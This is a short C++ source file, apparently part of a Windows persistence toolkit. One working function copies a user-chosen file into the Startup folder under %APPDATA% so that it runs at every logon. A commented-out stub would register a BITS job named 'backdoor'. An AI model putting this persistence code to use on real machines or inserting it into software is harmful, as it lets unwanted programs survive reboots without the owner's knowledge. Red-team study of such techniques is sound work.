#include "common.h"
#include "RegistryPersistence.h"

BOOL link_file_startup()
{
	string destPath = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
	string appdata = "%APPDATA%";
	string finalPath;
	string sourceFilePath, destFilePath;

	cout << "Enter the path for source: " << endl;
	cin >> sourceFilePath;

	cout << "Enter the destination file name: " << endl;
	cin >> destFilePath;

	DWORD size = ExpandEnvironmentStrings((LPCSTR)appdata.c_str(), NULL, NULL);
	if (size == 0)
	{
		printf("Function failed to expand variable: %x \n", GetLastError());
	}

	char* resultString = new char[(DWORD)size];
	ExpandEnvironmentStrings((LPCSTR)appdata.c_str(), resultString, (DWORD)(size));

	finalPath = resultString + destPath + "\\" + destFilePath;

	BOOL check = CopyFile((LPCSTR)sourceFilePath.c_str(), (LPCSTR)finalPath.c_str(), TRUE);
	if (check == 0){
		printf("Unable to copy file: %x \n ", GetLastError());
	}
	return TRUE;

}





//
//BOOL bitadmin_persis()
//{
//	wstring params;
//
//	// Get name and payload from the user
//	wstring name = L"backdoor";
//
//	params = L"/create " + name;
//
//	BOOL check = process(L"bitsadmin", params.c_str());
//
//}